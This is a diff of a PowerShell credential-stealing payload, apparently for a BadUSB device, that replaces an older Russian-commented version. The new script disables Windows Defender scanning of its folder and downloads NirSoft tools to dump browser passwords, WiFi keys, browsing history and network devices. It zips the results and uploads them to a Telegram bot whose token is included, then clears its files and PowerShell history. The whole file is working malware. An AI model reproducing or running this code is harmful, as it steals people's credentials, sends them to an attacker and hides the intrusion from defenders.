@@ -1,55 +1,103 @@
+#                      _                        
+#  _   _  ___  _   _  | | ___ __   _____      __
+# | | | |/ _ \| | | | | |/ /  _ \ / _ \ \ /\ / /
+# | |_| | (_) | |_| |_|   <| | | | (_) \ V  V / 
+#  \__, |\___/ \__,_(_)_|\_\_| |_|\___/ \_/\_/  
+#  |___/                                        
+
 $basePath = "C:\Users\Public\Documents\scripts"
-$dumpFolder = "$basePath\Report"
-$dumpFile = "$basePath\data.zip"
+$dumpFolder = "$basePath\$env:USERNAME-$(get-date -f yyyy-MM-dd)"
+$dumpFile = "$dumpFolder.zip"
 
-# 1. Подготовка папок
-if (Test-Path $basePath) { Remove-Item -Recurse -Force $basePath -ErrorAction SilentlyContinue }
-New-Item -ItemType Directory -Path $dumpFolder -Force | Out-Null
+# Create directory
+New-Item -ItemType Directory -Path $basePath -Force | Out-Null
 Set-Location $basePath
+New-Item -ItemType Directory -Path $dumpFolder -Force | Out-Null
+Add-MpPreference -ExclusionPath $basePath -Force
 
-# 2. Пытаемся добавить в исключения (игнорируя ошибку, если дефендер выключен)
-try { Add-MpPreference -ExclusionPath $basePath -Force -ErrorAction SilentlyContinue } catch {}
+# Download necessary tools
+Invoke-WebRequest https://github.com/tuconnaisyouknow/BadUSB_passStealer/blob/main/other_files/WirelessKeyView.exe?raw=true -OutFile WirelessKeyView.exe
+Invoke-WebRequest https://github.com/tuconnaisyouknow/BadUSB_passStealer/blob/main/other_files/WebBrowserPassView.exe?raw=true -OutFile WebBrowserPassView.exe
+Invoke-WebRequest https://github.com/tuconnaisyouknow/BadUSB_passStealer/blob/main/other_files/BrowsingHistoryView.exe?raw=true -OutFile BrowsingHistoryView.exe
+Invoke-WebRequest https://github.com/tuconnaisyouknow/BadUSB_passStealer/blob/main/other_files/WNetWatcher.exe?raw=true -OutFile WNetWatcher.exe
 
-# 3. Функция для безопасного скачивания и запуска
-function Download-And-Run($url, $name, $args) {
-    try {
-        $path = "$basePath\$name"
-        Invoke-WebRequest -Uri $url -OutFile $path -ErrorAction SilentlyContinue
-        if (Test-Path $path) {
-            Unblock-File $path
-            # Запуск через Start-Process, чтобы избежать ошибок консоли
-            Start-Process -FilePath $path -ArgumentList $args -WindowStyle Hidden -Wait
-            Remove-Item $path -Force -ErrorAction SilentlyContinue # Удаляем exe сразу после работы
-        }
-    } catch {}
+
+# Execute tools to gather data
+.\WNetWatcher.exe /stext connected_devices.txt
+.\BrowsingHistoryView.exe /VisitTimeFilterType 3 7 /stext history.txt
+.\WebBrowserPassView.exe /stext passwords.txt
+.\WirelessKeyView.exe /stext wifi.txt
+
+# Wait for the files to be fully written
+while (!(Test-Path "passwords.txt") -or !(Test-Path "wifi.txt") -or !(Test-Path "connected_devices.txt") -or !(Test-Path "history.txt")) {
+    Start-Sleep -Seconds 1
 }
 
-# 4. Ссылки
-$myRepo = "https://raw.githubusercontent.com/whetherit/tools/main"
-$origRepo = "https://raw.githubusercontent.com/tuconnaisyouknow/BadUSB_passStealer/main/other_files"
+Move-Item passwords.txt, wifi.txt, connected_devices.txt, history.txt -Destination "$dumpFolder"
 
-# 5. Сбор данных по очереди
-Download-And-Run "$myRepo/WebBrowserPassView.exe" "WebBrowserPassView.exe" "/stext passwords.txt"
-Download-And-Run "$origRepo/WirelessKeyView.exe" "WirelessKeyView.exe" "/stext wifi.txt"
-Download-And-Run "$origRepo/BrowsingHistoryView.exe" "BrowsingHistoryView.exe" "/VisitTimeFilterType 3 7 /stext history.txt"
-Download-And-Run "$origRepo/WNetWatcher.exe" "WNetWatcher.exe" "/stext connected_devices.txt"
+# Compress extracted data
+Compress-Archive -Path "$dumpFolder\*" -DestinationPath "$dumpFile" -Force
 
-Start-Sleep -Seconds 2
-
-# 6. Упаковка только текстовых отчетов
-$txtFiles = Get-ChildItem -Path $basePath -Filter "*.txt"
-if ($txtFiles) {
-    Move-Item $txtFiles -Destination $dumpFolder -Force -ErrorAction SilentlyContinue
-    Compress-Archive -Path "$dumpFolder\*" -DestinationPath $dumpFile -Force
+# Wait until the ZIP file is created
+while (!(Test-Path "$dumpFile")) {
+    Start-Sleep -Seconds 1
 }
 
-# 7. Отправка в Telegram
+# Telegram configuration
 $token = "8453011015:AAFvYt0ZjgkUFAjtnLvONdmXl19l7GK9tfM"
 $chatID = "806761221"
-if (Test-Path $dumpFile) {
-    & curl.exe -F "chat_id=$chatID" -F "document=@$dumpFile" "https://api.telegram.org/bot$token/sendDocument"
+$uri = "https://api.telegram.org/bot$token/sendDocument"
+$caption = "Here are exfiltrated informations from $env:USERNAME"
+
+# Check if the file exists before sending
+if (!(Test-Path $dumpFile)) {
+    exit 1
 }
 
-# 8. Очистка
-Set-Location "C:\Users\Public"
-Remove-Item -Recurse -Force $basePath -ErrorAction SilentlyContinue
+# Ensure System.Net.Http is available
+if (-not ("System.Net.Http.HttpClient" -as [type])) {
+    $httpPath = Get-ChildItem -Path "C:\Windows\Microsoft.NET\Framework64\" -Recurse -Filter "System.Net.Http.dll" | Select-Object -First 1 -ExpandProperty FullName
+    if ($httpPath) {
+        Add-Type -Path $httpPath
+    } else {
+        exit 1
+    }
+}
+
+# Create HTTP client
+$client = New-Object System.Net.Http.HttpClient
+$content = New-Object System.Net.Http.MultipartFormDataContent
+$content.Add((New-Object System.Net.Http.StringContent($chatID)), "chat_id")
+$content.Add((New-Object System.Net.Http.StringContent($caption)), "caption")
+
+# Attach the ZIP file
+$filename = [System.IO.Path]::GetFileName("$dumpFile")
+$fileStream = [System.IO.File]::OpenRead("$dumpFile")
+$fileContent = New-Object System.Net.Http.StreamContent($fileStream)
+$fileContent.Headers.ContentType = [System.Net.Http.Headers.MediaTypeHeaderValue]::Parse("application/octet-stream")
+$content.Add($fileContent, "document", $filename)
+
+# Send data to Telegram
+try {
+    $client.PostAsync($uri, $content).Wait()
+} catch {}
+
+# Cleanup
+$fileStream.Close()
+$fileStream.Dispose()
+
+Set-Location C:\Users\Public\Documents
+Remove-Item -Recurse -Force scripts
+Remove-MpPreference -ExclusionPath "C:\Users\Public\Documents\scripts" -Force
+
+# Caps Lock signal
+$keyBoardObject = New-Object -ComObject WScript.Shell
+for ($i=0; $i -lt 4; $i++) {
+    $keyBoardObject.SendKeys("{CAPSLOCK}")
+    Start-Sleep -Seconds 1
+}
+
+# Clear command history
+Clear-Content (Get-PSReadlineOption).HistorySavePath
+
+exit
